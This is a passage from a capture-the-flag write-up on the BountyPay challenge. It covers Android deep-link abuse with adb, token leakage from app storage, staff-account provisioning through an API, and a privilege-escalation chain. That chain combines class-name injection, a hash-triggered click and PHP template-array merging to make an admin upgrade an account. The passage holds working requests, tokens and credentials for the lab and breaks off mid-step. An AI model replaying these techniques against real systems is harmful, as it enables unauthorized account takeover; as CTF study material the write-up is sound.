Now that everything is set up we can launch the app. First it just asks us for our username and (optional) twitter handle. On the next screen, nothing seems to happen, and the clues at the bottom say "deep links" and "params":
{F862914}

Going back to our Java source code, within `PartOneActivity.java`, we see:
```java
if (getIntent() != null && getIntent().getData() != null) {
  String str = getIntent().getData().getQueryParameter("start");
  if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
	str = sharedPreferences.getString("USERNAME", "");
	SharedPreferences.Editor editor = sharedPreferences.edit();
	String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
	editor.putString("PARTONE", "COMPLETE").apply();
	logFlagFound(str, str1);
	startActivity(new Intent((Context)this, PartTwoActivity.class));
  } 
} 
```

Not having developed for Android ever before, it wasn't completely obvious what this is doing until I googled for `getIntent()` and deep links. The official guide on [Deep Links](https://developer.android.com/training/app-links/deep-linking) explains it all very well. In particular, [Test your deep links](https://developer.android.com/training/app-links/deep-linking#testing-filters) section is exactly what we're after since it allows us to send a deep link to the app via `adb`.

We can see the intents that the app has defined within `AndroidManifest.xml`:
```xml
<activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:host="part" android:scheme="one"/>
    </intent-filter>
</activity>
```

The key part here is `<data android:host="part" android:scheme="one"/>` which gives us the scheme and host to use in the URL, as well as `<action android:name="android.intent.action.VIEW"/>` which is the intent name. From Java source code we see that it wants URl to have a `start` query string parameter, equal to `PartTwoActivity`, so the command we run in `adb` is:

```bash
$ adb shell am start -W -a android.intent.action.VIEW -d "one://part/?start=PartTwoActivity" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=one://part/?start=PartTwoActivity pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartOneActivity
ThisTime: 883
TotalTime: 883
WaitTime: 893
Complete
```

### Android | PartTwoActivity

This moves us to the next screen, where the hints are `currently invisible` and `visible with the right params`, and nothing further visible on screen.

Looking at the java source code for `PartTwoActivity.java` we see:
```java
if (getIntent() != null && getIntent().getData() != null) {
  Uri uri = getIntent().getData();
  String str1 = uri.getQueryParameter("two");
  String str2 = uri.getQueryParameter("switch");
  if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
	editText.setVisibility(0);
	button.setVisibility(0);
	textView.setVisibility(0);
  } 
} 
```
and the corresponding intent defined within `AndroidManifest.xml`:
```xml
<activity android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity" android:theme="@style/AppTheme.NoActionBar">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:host="part" android:scheme="two"/>
    </intent-filter>
</activity>
```
So similar to the first step I crafted the following deep link and sent it to the app:
```bash
$ adb shell am start -W -a android.intent.action.VIEW -d "two://part/?two=light&switch=on" bounty.pay
/system/bin/sh: bounty.pay: not found
Starting: Intent { act=android.intent.action.VIEW dat=two://part/?two=light }
Status: ok
Activity: bounty.pay/.PartTwoActivity
ThisTime: 368
TotalTime: 368
WaitTime: 384
Complete
```
Which failed... you can see it only sent first parameter, and also there was an error that a package was not found. It was easy enough to find the [answer](https://stackoverflow.com/a/35645448/5540279) on stackoverflow, and the issue was that `&` needs to be escaped with `\` (or alternatively one could wrap the shell command in single quotes):
```bash
$ adb shell am start -W -a android.intent.action.VIEW -d "two://part/?two=light\&switch=on" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=two://part/?two=light&switch=on pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartTwoActivity
ThisTime: 241
TotalTime: 241
WaitTime: 258
Complete
```

We're now presented with an input field where we need to guess a Header value, which would be checked against Firebase:
{F862915}

Since I already read the entire source code I knew the answer for it. Within `PartThreeActivity.java` we see the following line:
```java
byte[] decodedDirectoryTwo = Base64.decode("WC1Ub2tlbg==", 0);
```
When decoded, this value is `X-Token`, and that's exactly the header value we need to enter. You can also see an MD5 hash on the screen, `459a6f79ad9b13cbcb5f692d2cc7a94d`. Googling this value tells us that this is the hash for the word `Token`. It was hinting at the fact that the Header of interest is `X-Token`.

When I tried it, it didn't work. Checking the process log within Android Studio, I saw:
```
Caused by: javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.
```
This was clearly caused by intercepting traffic with Burp proxy. I simply turned off the proxy and it worked. There surely must have been a way to resolve certificate issues, but intercepting traffic wasn't necessary at all for this challenge, so I went with the easy route. With that issue resolved, submitting`X-Token` as the Header value moves us to the next activity:

### Android | PartThreeActivity

We again see the blank screen with hints: `Reuse some params.` and `Intercept or check for leaks.`

Based on the java code, at the start of this activity the app should have authenticated anonymously with Firebase and fetched the values for Token and Host and saved them to a local preferences file:
```java
Handler handler = new Handler();
handler.postDelayed(new Runnable() {
      public void run() {
        Log.i("TAG", "Starting authentication");
        PartThreeActivity.this.signIn();
      }
    }10000L);
handler.postDelayed(new Runnable() {
      public void run() {
        Log.i("TAG", "Getting host endpoint");
        PartThreeActivity.this.getHost();
      }
    }20000L);
handler.postDelayed(new Runnable() {
      public void run() {
        Log.i("TAG", "Getting Token");
        PartThreeActivity.this.getToken();
      }
    }20000L);
```
```java
private void signIn() {
  this.mAuth = FirebaseAuth.getInstance();
  this.mAuth.signInAnonymously().addOnCompleteListener((Activity)this, new OnCompleteListener<AuthResult>() {
        public void onComplete(Task<AuthResult> param1Task) {
          if (param1Task.isSuccessful()) {
            Log.d("TAG", "signInAnonymously:success");
            PartThreeActivity.this.mAuth.getCurrentUser();
            return;
          } 
          Log.w("TAG", "signInAnonymously:failure", param1Task.getException());
          Toast.makeText((Context)PartThreeActivity.this, "Authentication failed.", 0).show();
        }
      });
}
private void getHost() {
  final SharedPreferences.Editor editor = getSharedPreferences("user_created", 0).edit();
  this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
        public void onCancelled(DatabaseError param1DatabaseError) {
          Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
        }

        public void onDataChange(DataSnapshot param1DataSnapshot) {
          String str = (String)param1DataSnapshot.getValue();
          editor.putString("HOST", str).apply();
        }
      });
}
  
private void getToken() {
  final SharedPreferences.Editor editor = getSharedPreferences("user_created", 0).edit();
  this.childRefTwo.addListenerForSingleValueEvent(new ValueEventListener() {
        public void onCancelled(DatabaseError param1DatabaseError) {
          Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
        }

        public void onDataChange(DataSnapshot param1DataSnapshot) {
          String str = (String)param1DataSnapshot.getValue();
          editor.putString("TOKEN", str).apply();
        }
      });
}
```
But that didn't actually happen. Checking the app logs with `adb logcat` (or better - Android Studio provides a handy `Logcat` tool window) I noticed that it could not authenticate with Firebase:

```
bounty.pay W/DynamiteModule: Local module descriptor class for com.google.firebase.auth not found.
bounty.pay W/GooglePlayServicesUtil: Google Play services out of date.  Requires 12451000 but found 11947470
```
This was because I was running Android 7.1.1 Nougat in my emulator. I probably could have upgraded Google Play, but instead I just installed 9.0 Pie SDK and launched another device. Note: you need a device with Google Play pre-installed - only some are.

After re-doing all the steps, I saw in logcat that everything went smoothly:
```
bounty.pay I/TAG: Starting authentication
bounty.pay D/TAG: signInAnonymously:success
bounty.pay I/TAG: Getting host endpoint
bounty.pay I/TAG: Getting Token
```

We can now retrieve the secret values from the local storage:
```bash
$ adb shell
generic_x86_arm:/ $ run-as bounty.pay
generic_x86_arm:/data/data/bounty.pay $ cd shared_prefs/
generic_x86_arm:/data/data/bounty.pay/shared_prefs $ cat user_created.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="USERNAME">nirvana_msu</string>
    <string name="PARTTWO">COMPLETE</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">nirvana_msu</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map>
```

At this stage we could have just moved on to the next part (back to web) of the CTF but I wanted to follow through the designed challenges to the end.

We need to send another deep link. Relevant code from `PartThreeActivity.java`:

```java
if (getIntent() != null && getIntent().getData() != null) {
  Uri uri = getIntent().getData();
  final String firstParam = uri.getQueryParameter("three");
  final String secondParam = uri.getQueryParameter("switch");
  final String thirdParam = uri.getQueryParameter("header");
  byte[] arrayOfByte2 = Base64.decode(str1, 0);
  byte[] arrayOfByte1 = Base64.decode(str2, 0);
  final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);
  final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);
  this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
        public void onCancelled(DatabaseError param1DatabaseError) {
          Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
        }
        
        public void onDataChange(DataSnapshot param1DataSnapshot) {
          String str = (String)param1DataSnapshot.getValue();
          if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on")) {
            String str1 = thirdParam;
            if (str1 != null) {
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("X-");
              stringBuilder.append(str);
              if (str1.equals(stringBuilder.toString())) {
                editText.setVisibility(0);
                button.setVisibility(0);
                PartThreeActivity.this.thread.start();
              } 
            } 
          } 
        }
      });
} 
```
And intent declaration from  `AndroidManifest.xml`:
```xml
<activity android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity" android:theme="@style/AppTheme.NoActionBar">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:host="part" android:scheme="three"/>
    </intent-filter>
</activity>
```
Based on the above I crafted the next deep link:
```
$ adb shell am start -W -a android.intent.action.VIEW -d "three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=three://part/?three=UGFydFRocmVlQWN0aXZpdHk=&switch=b24=&header=X-Token pkg=bounty.pay }
Status: ok
Activity: bounty.pay/.PartThreeActivity
ThisTime: 224
TotalTime: 224
WaitTime: 253
Complete
```
This reveals the input to submit the leaked hash:
{F862959}

I entered the token `8e9998ee3137ca9ade8f372739f062c1` and was presented with the final screen, confirming that Android challenges were complete. There was also a rather obvious message that `Information leaked here will help with other challenges.`:
{F862964}

## Social Media

Ok, so from the whole of Android challenge, we understood that we could use the header `X-Token: 8e9998ee3137ca9ade8f372739f062c1` with the host `http://api.bountypay.h1ctf.com`.

And indeed we can confirm it works as authentication for the API endpoints:

```http
GET /api/accounts/F8gHiqSdpK/statements?month=05&year=2020 HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"description":"Transactions for 2020-05","transactions":[]}
```

Great. But what does it really give us? We could have already made GET requests via SSRF. What we can do now that we could not do with SSRF is make POST requests, so that must be the next step we're looking for.

Endpoints known to us so far under `/api` did not respond to POST requests - so it's time for Content Discovery again. I've fired a bruteforce to look for new endpoints that respond to POST (as we'll see later, GET would have worked as well) and after a bit I found the new endpoint:

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

["Missing Parameter"]
```
So we're missing some parameter. Checking the GET request for the same endpoint:
```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```
we see a new parameter, `staff_id`. Back to the POST endpoint, trying one of those staff ids gives us:
```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
X-Token: 8e9998ee3137ca9ade8f372739f062c1

staff_id=STF:KE624RQ2T9
```
```http
HTTP/1.1 409 Conflict
Content-Type: application/json

["Staff Member already has an account"]
```
HTTP Code [`409 Conflict`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/409) implies that the endpoint is supposed to create something. Together with the message it becomes fairly clear that the endpoint should be used to provision a new account for a staff member. The only two staff ids we have from the GET request give us same message. Entering an invalid value just results in the message `["Invalid Staff ID"]`.

I recalled seeing a [BountypayHQ](https://twitter.com/BountypayHQ) Twitter account earlier in my twitter feed - several people retweeted / liked some tweets.There was a [tweet](https://twitter.com/BountypayHQ/status/1258692286256500741) saying `Today we welcome Sandra to the team!!!`. 

That sounds a lot like we have to find a staff id for that Sandra person, but this is actually where I got stuck. Somehow it didn't occur to me to check Twitter followers so I went on to try loads of different things:

  * Earlier I saw another Twitter account, [BountypayH](https://twitter.com/BountypayH) which had a tweet saying `Always check for SQLi`. Back then I didn't realise it was just a troll, so I went ahead and fired sqlmap at every endpoint I could think of. I even tried looking for injections within session's JSON payload. That didn't yield anything, but at least I leaned some new sqlmap tricks..
  * `Sam Jenkins`, the name of the other staff member, could have possibly hinted at the fact that we need to find a Jenkins instance somewhere? There's no such subdomain, and unclear where else we could look for it. I tried checking a few endpoints on `software` subdomain but this was a dead-end,
  * I tried to decrypt session hash, or craft another hash based on the account information for Sam, but it did not lead anywhere at all.
  * I tried to forge session cookie for `staff` subdomain, assuming it follows same structure/principles as the cookie of `app` subdomain - another dead end.
  * I recalled that `staff` subdomain was also whitelisted for redirect, so we could access it via SSRF. Maybe there's something on it that we could only access via SSRF? I did a bruteforce on available templates and found new ones such as `ticket` and `admin`. [Admin template](https://staff.bountypay.h1ctf.com/?template=admin) responded with a message `No Access to this resource`. I tried it via SSRF but it still responded with same message.
  * Tried bruteforcing Sam's password on both `app` and `staff` subdomain - no luck.

After banging my head against the wall with all those dead ends  I reached out to [@bbuerhaus](https://twitter.com/bbuerhaus) to bounce my ideas, who confirmed I was on the right track with finding Sandra's staff id, and it wasn't long before I found [Sandra's](https://twitter.com/SandraA76708114) twitter account among both [following](https://twitter.com/BountypayHQ/following) and [followers](https://twitter.com/BountypayHQ/followers) lists for BountypayHQ, and in her timeline I saw [this tweet](https://twitter.com/SandraA76708114/status/1258693001964068864) with a photo featuring her staff access card that shows her Staff ID: `STF:8FJ3KFISL3`. Yay!

Finally I issued the `POST` request to `/api/staff` with Sandra's Staff ID, and surely enough it provisioned a new account for Sandra and gave us the credentials that we could use to login to Staff  portal at `staff.bountypay.h1ctf.com`:

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3
```

```http
HTTP/1.1 201 Created
Content-Type: application/json

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

## Privilege Escalation

Logging in to Staff portal as Sandra and looking through all HTML and JS sources I noted the following things:

1. Session cookie was no longer a base64-encoded JSON. It couldn't be decrypted - or not easily, at least.
2. There is functionality to change `profile_name` and `profile_avatar`, but in both cases every special character is removed, so looks like XSS is not an option.
3. Javascript code looked extremely interesting:

	```http
	GET /js/website.js HTTP/1.1
	Host: staff.bountypay.h1ctf.com
	Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
	```

	```js
	$(".upgradeToAdmin").click(function() {
		let t = $('input[name="username"]').val();
		$.get("/admin/upgrade?username=" + t, function() {
			alert("User Upgraded to Admin")
		})
	}), $(".tab").click(function() {
		return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
	}), $(".sendReport").click(function() {
		$.get("/admin/report?url=" + url, function() {
			alert("Report sent to admin team")
		}), $("#myModal").modal("hide")
	}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
	````
	Several things I noted here: 
	   * Issuing a request to `/admin/upgrade?username=` is likely the goal of this challenge, as this should escalate our privileges to Admin.
	   * There is a functionality to "send a report" to Admin team. 
	   * We can use `#tab1` ... `#tab4` in URL to invoke a click on the tab on page load.
	   * There was no element with class`tab4` on the page (only `tab1`, `tab2`, `tab3`), which was interesting. 
4. The "send report" functionality is clarified in the HTML code:
	> Is there something wrong with this page? If so hit the "Report Now" button and the page will be sent over to our admins to checkout.
	> Pages in the /admin directory will be ignored for security
5. There is a second endpoint, `/?template=ticket&ticket_id=3582`, where `profile_name` and `profile_avatar`are reflected as well. It shows a message from Admin to Sandra.
6. Within both HTML pages we observe code like
	```html
	<script>
	    var url = 'Lz90ZW1wbGF0ZT1ob21l';
	</script>
	```
	The value here is the base64-encoded URL path, in this case it is `/?template=home`. This is the value sent when reporting a page, meaning we can report an arbitrary page to Admin by encoding the URL path with base64.

First thing I tried was to hit the priv esc endpoint directly:

```http
GET /admin/upgrade?username=sandra.allison HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
```
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

["Only admins can perform this"]
```

Ok, so it's fairly clear that our goal to make Admin issue this GET request for us, and this is exactly what the functionality to report the page is for. My next attempt was to report this endpoint, so that Admin would visit it. Encoding `/admin/upgrade?username=sandra.allison`gives us `L2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24=`, but reporting this page results in same response as reporting any other page:
```http
GET /admin/report?url=L2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24= HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

["Report received"]
```
This is expected, given we were told that `Pages in the /admin directory will be ignored for security`.

At this point I went the wrong way and tried loads of different things, all leading to a dead end:

* I tried to see if Admin would access an external URL, such as Burp Collaborator. I tried a number of tricks that wold normally be used for an Open Redirect bypass, but none worked.
* I though that  `Pages in the /admin directory will be ignored for security` message could be quite literal - maybe there's e.g .a regex check that a path starts with `/admin` that could be bypassed. I tried a number of things like path traversal, using `\` instead of `/` etc but nothing worked.
* By this point I still didn't realize SQLi hint was a troll, so I fired up sqlmap again. I've even tried injections within the reported pages - in case something worked differently for Admin than for us.
* The support ticket functionality reminded me of [Ticket Trick](https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c), so I tried sending a few emails to addresses like `support@staff.bountypay.h1ctf.com` - all bounced back.
* We don't have XSS with `profile_name` and `profile_avatar` parameters, but maybe we have [SSTI](https://portswigger.net/research/server-side-template-injection)? Curly braces were filtered out as well..

I was clearly going down the rabbit hole, especially with that SQLi trolling, so I pinged [@xEHLE_](https://twitter.com/xEHLE_) for a reality check, and he confirmed that I was on the right path originally with trying to make Admin visit the priv esc endpoint, and that I was just overlooking something in the javascript code. And indeed, looking more closely at the jQuery selectors I realised they were too loose and just selected the element(s) based on a class name, and not id: `$(".upgradeToAdmin").click`.

The pieces of the puzzle immediately came together. Coincidentally, we have control of the class name via `profile_avatar` parameter. Coupled with the `#tab4` we can make Admin issue the request to the priv esc endpoint without any interaction! The steps that had to be taken are thus:

1. Change our `profile_avatar` to `upgradeToAdmin tab4`. `tab4` class (together with `#tab4` in the URL) is needed so that the element would be clicked on, and `upgradeToAdmin` class ensures the desired jQuery callback would fire.
2. `profile_avatar`is reflected within our home page, but it's of no use to us since when Admin access the reported page, it would show his details and not ours. We need a page where Admin user would still have our `profile_avatar` reflected, and that's exactly the ticket page!
3. We thus report `/?template=ticket&ticket_id=3582#tab4`, which base64-encoded is `Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA==`:

```http
GET /admin/report?url=Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA== HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

["Report received"]
```

Not so fast. We got half-way there, and we seem to be on the right track, but look again at the JS code:
```javascript
$(".upgradeToAdmin").click(function() {
	let t = $('input[name="username"]').val();
	$.get("/admin/upgrade?username=" + t, function() {
		alert("User Upgraded to Admin")
	})
})
```
There is no input with name `username` anywhere on the ticket page, so the request that Admin sends is actually`/admin/upgrade?username=undefined` (which can be confirmed by visiting our crafted URL directly in the browser).

At this point it didn't seem possible to me to influence the request any further so I went down a few more rabbit holes, including searching for SQLi again. This is finally when [@bbuerhaus](https://twitter.com/bbuerhaus) told me that there is no SQLi in this CTF and that it was just a troll :doh:, and that I should continue focusing on getting the admin to issue the request with desired `username`.

Ok, so we need an input with name `username` then. And it finally struck me that there is indeed one such input - back at the login page. This is when the second stage of the puzzle came together for me. Recall that we're dealing with PHP - where we can turn any parameter we submit in our request into an array by simply doing `?param[]=1&param[]=2`. It's finally clear why the URL routing was using this awkward syntax: `/?template=home`.

I immediately tried turning template parameter into an array, in the hope that the backend would merge the two templates - and it did! Note the second `<!DOCTYPE html>` in the middle. followed by the second template:

```http
GET /?template[]=ticket&ticket_id=3582&template[]=login&username=sandra.allison HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>BountyPay Staff Portal</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/css/style.css" rel="stylesheet">
</head>
<body><nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">BountyPay Staff</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
            <ul class="nav navbar-nav navbar-right">
                <li><a href="/logout">Logout</a></li>
            </ul>
        </div><!--/.nav-collapse -->
    </div>
</nav>
<div class="container" style="margin-top:60px">
    <div class="row">

        <div class="col-md-8 col-md-offset-2">


            <div class="panel panel-default">
                <div class="panel-heading">Message</div>
                <div class="panel-body">
                    <div style="width: 100px;position: absolute">
                        <div style="margin:auto" class="avatar avatar3"></div>
                        <div class="text-center">Admin</div>
                    </div>
                    <div>
                        <div class="alert alert-info" style="margin-left:100px;min-height:80px">
                            <p>Welcome to the staff portal, This is an automated message to show you what a ticket looks like</p>
                        </div>
                    </div>
                </div>
            </div>


            <div class="panel panel-default">
                <div class="panel-heading">Reply</div>
                <div class="panel-body">
                    <div style="width: 100px;position: absolute">
                        <div style="margin:auto" class="avatar upgradeToAdmin tab4"></div>
                        <div class="text-center">sandra</div>
                    </div>
                    <div>
                        <div style="margin-left:100px;min-height: 100px">
                            <textarea disabled class="form-control">Replies are currently disabled</textarea>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer" style="position: absolute;bottom:0;font-size:10px;height:30px;width:100%;background-color: #ececec;line-height:30px;text-align: center">
    &copy;2020 BountyPay | <a href="#" data-toggle="modal" data-target="#myModal">Report This Page</a>
</div>

<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="myModalLabel">Report Page</h4>
            </div>
            <div class="modal-body">
                <p>Is there something wrong with this page? If so hit the "Report Now" button and the page will be sent over to our admins to checkout.</p>
		<p>Pages in the /admin directory will be ignored for security</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
                <button type="button" class="btn btn-primary sendReport">Report Now</button>
            </div>
        </div>
    </div>
</div>



<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script>
    var url = 'Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29u';
</script>
<script src="/js/website.js"></script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Staff Login</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

<div class="container">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <h1 style="text-align: center">Staff Login</h1>
                        <form method="post" action="/?template=login">
                <div class="panel panel-default" style="margin-top:50px">
                    <div class="panel-heading">Login</div>
                    <div class="panel-body">
                        <div style="margin-top:7px"><label>Username:</label></div>
                        <div><input name="username" class="form-control" value="sandra.allison"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input name="password" type="password" class="form-control"></div>
                    </div>
                </div>
                <input type="submit" class="btn btn-success pull-right" value="Login">
            </form>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```

I have to say that while it was a fairly obvious thing to try after realising that you need to use `username` input from the login page - that's not something I would expect to see in a real-world application. I mean the general trick of breaking the app behavior by passing an Array to it is commonplace of course, for to actually have a backend that merges templates seems unlikely (at least no established framework would allow that) - there must have been some pretty custom code in the backend that lead to this.

Back the the CTF - note that conveniently, we can also set the value for the `username` input via a GET parameter, which is the last piece for the attack chain.

I then reported the following URL: `/?template[]=ticket&ticket_id=3582&template[]=login&username=sandra.allison#tab4`
```http
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ= HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
```
and ... nothing happened. Visiting that URL directly in the browser I saw that the request was still being made to `/admin/upgrade?username=undefined`. Of course, that makes sense. Javascript (unless loaded asynchronously) is evaluated immediately when it is encountered in the DOM, meaning that it only has access to DOM elements that precede it. I've put the templates in the wrong order, and `username` input simply didn't exist on the page yet when our code was executed.

Finally, I reversed the order of templates: `/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4`
```http
